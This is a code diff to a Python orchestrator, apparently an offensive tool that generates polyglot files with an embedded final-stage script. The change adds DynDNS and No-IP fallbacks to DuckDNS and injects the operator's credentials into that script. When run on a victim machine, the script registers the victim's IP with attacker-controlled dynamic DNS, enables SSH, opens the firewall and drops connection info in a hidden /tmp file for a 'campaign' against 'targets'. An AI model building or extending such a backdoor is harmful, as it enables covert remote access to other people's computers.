@@ -92,6 +92,11 @@ class PolyglotOrchestrator:
         self.ssh_port = None
         self.ssh_script_content = None
 
+        # DNS fallback configuration (for DuckDNS, DynDNS, No-IP)
+        self.dns_fallback_enabled = False
+        self.dyndns_config = None  # {'domain': str, 'user': str, 'pass': str}
+        self.noip_config = None    # {'domain': str, 'user': str, 'pass': str}
+
         # Initialize beacon integrator if available
         self.beacon_integrator = None
         if BEACON_AVAILABLE and BeaconIntegrator:
@@ -191,6 +196,125 @@ class PolyglotOrchestrator:
         # Show operation summary
         self._show_operation_summary()
 
+    def _generate_dns_fallback_injection(self) -> str:
+        """
+        Generate Python code injection for DNS fallback configuration
+
+        Returns:
+            Python code string with DynDNS and No-IP configuration
+        """
+        injection_code = ""
+
+        if self.dyndns_config:
+            injection_code += f"""
+# DynDNS Fallback Configuration
+DYNDNS_DOMAIN = "{self.dyndns_config['domain']}"
+DYNDNS_USER = "{self.dyndns_config['user']}"
+DYNDNS_PASS = "{self.dyndns_config['pass']}"
+DYNDNS_UPDATE_URL = "https://www.dyndns.org/nic/update"
+"""
+
+        if self.noip_config:
+            injection_code += f"""
+# No-IP Fallback Configuration
+NOIP_DOMAIN = "{self.noip_config['domain']}"
+NOIP_USER = "{self.noip_config['user']}"
+NOIP_PASS = "{self.noip_config['pass']}"
+NOIP_UPDATE_URL = "https://dynupdate.no-ip.com/nic/update"
+"""
+
+        return injection_code
+
+    def _prompt_dns_fallback_setup(self):
+        """
+        Prompt for DNS fallback service configuration
+
+        Allows user to configure DynDNS and No-IP as fallback services
+        if DuckDNS fails during target registration.
+
+        Credentials are prompted for (not hardcoded) for security.
+        """
+        self.tui.section("🌐 DNS Fallback Services Configuration")
+        self.tui.info("Configure fallback DNS services for additional redundancy")
+        self.tui.list_item("Primary: DuckDNS", level=1)
+        self.tui.list_item("Fallback 1: DynDNS (optional)", level=1)
+        self.tui.list_item("Fallback 2: No-IP (optional)", level=1)
+        print()
+
+        # Ask about DynDNS
+        if self.menu.confirm("Configure DynDNS fallback?", default=False):
+            try:
+                dyndns_domain = self.menu.prompt_input(
+                    "DynDNS domain",
+                    default="example.dyndns.org"
+                )
+                dyndns_user = self.menu.prompt_input(
+                    "DynDNS username"
+                )
+                dyndns_pass = self.menu.prompt_input(
+                    "DynDNS password"
+                )
+
+                self.dyndns_config = {
+                    'domain': dyndns_domain,
+                    'user': dyndns_user,
+                    'pass': dyndns_pass
+                }
+
+                self.tui.success(f"✓ DynDNS configured: {dyndns_domain}")
+                print()
+
+            except Exception as e:
+                self.tui.error(f"Failed to configure DynDNS: {e}")
+
+        # Ask about No-IP
+        if self.menu.confirm("Configure No-IP fallback?", default=False):
+            try:
+                noip_domain = self.menu.prompt_input(
+                    "No-IP domain",
+                    default="example.no-ip.org"
+                )
+                noip_user = self.menu.prompt_input(
+                    "No-IP username"
+                )
+                noip_pass = self.menu.prompt_input(
+                    "No-IP password"
+                )
+
+                self.noip_config = {
+                    'domain': noip_domain,
+                    'user': noip_user,
+                    'pass': noip_pass
+                }
+
+                self.tui.success(f"✓ No-IP configured: {noip_domain}")
+                print()
+
+            except Exception as e:
+                self.tui.error(f"Failed to configure No-IP: {e}")
+
+        # Show summary
+        if self.dyndns_config or self.noip_config:
+            self.dns_fallback_enabled = True
+            print()
+            self.tui.box("✅ DNS FALLBACK ENABLED", [
+                "",
+                "Fallback chain in order of preference:",
+                "  1. Primary:  polygottem.duckdns.org",
+            ])
+
+            if self.dyndns_config:
+                print(f"  2. Fallback: {self.dyndns_config['domain']} (DynDNS)")
+            if self.noip_config:
+                fallback_num = 3 if self.dyndns_config else 2
+                print(f"  {fallback_num}. Fallback: {self.noip_config['domain']} (No-IP)")
+
+            print()
+        else:
+            self.tui.info("No additional DNS fallback services configured")
+            self.dns_fallback_enabled = False
+            print()
+
     def _prompt_remote_access_setup(self):
         """
         Prompt for remote access setup BEFORE workflow execution
@@ -229,20 +353,52 @@ class PolyglotOrchestrator:
                     f'ssh_port = {self.ssh_port}  # Pre-configured port'
                 )
 
+                # Inject DNS fallback credentials if configured
+                if self.dns_fallback_enabled:
+                    dns_config_injection = self._generate_dns_fallback_injection()
+                    # Insert DNS config injection after imports and before main logic
+                    insertion_point = self.ssh_script_content.find("# Embedded DuckDNS credentials")
+                    if insertion_point != -1:
+                        self.ssh_script_content = (
+                            self.ssh_script_content[:insertion_point] +
+                            dns_config_injection +
+                            "\n" +
+                            self.ssh_script_content[insertion_point:]
+                        )
+
                 # Enable remote access
                 self.remote_access_enabled = True
 
+                # Prompt for DNS fallback configuration
+                print()
+                self._prompt_dns_fallback_setup()
+
                 # Display configuration prominently
                 print()
-                self.tui.box("✅ REMOTE ACCESS ENABLED", [
+                config_box = [
                     "",
                     f"🔌 SSH PORT: {self.ssh_port}",
-                    "",
+                    ""
+                ]
+
+                # Add DNS fallback info if configured
+                if self.dns_fallback_enabled:
+                    config_box.extend([
+                        "🌐 DNS FALLBACK SERVICES:",
+                        "   Primary:  polygottem.duckdns.org",
+                    ])
+                    if self.dyndns_config:
+                        config_box.append(f"   Fallback: {self.dyndns_config['domain']} (DynDNS)")
+                    if self.noip_config:
+                        config_box.append(f"   Fallback: {self.noip_config['domain']} (No-IP)")
+                    config_box.append("")
+
+                config_box.extend([
                     "The target_duckdns_setup.py script will be embedded as a final",
                     "stage in all generated polyglots. When executed on the target:",
                     "",
                     "  1. Target detects its public IP",
-                    f"  2. Registers with polygottem.duckdns.org",
+                    f"  2. Registers with DuckDNS (with fallback services)",
                     f"  3. Enables SSH server on port {self.ssh_port}",
                     "  4. Configures firewall to allow access",
                     "  5. Saves connection info to /tmp/.polygottem_target_info.json",
@@ -250,6 +406,8 @@ class PolyglotOrchestrator:
                     f"Connect to target with: ssh -p {self.ssh_port} user@polygottem.duckdns.org",
                     ""
                 ])
+
+                self.tui.box("✅ REMOTE ACCESS ENABLED", config_box)
                 print()
 
                 self.tui.warning(f"⚠ REMEMBER: SSH Port {self.ssh_port} will be used for all targets in this campaign")
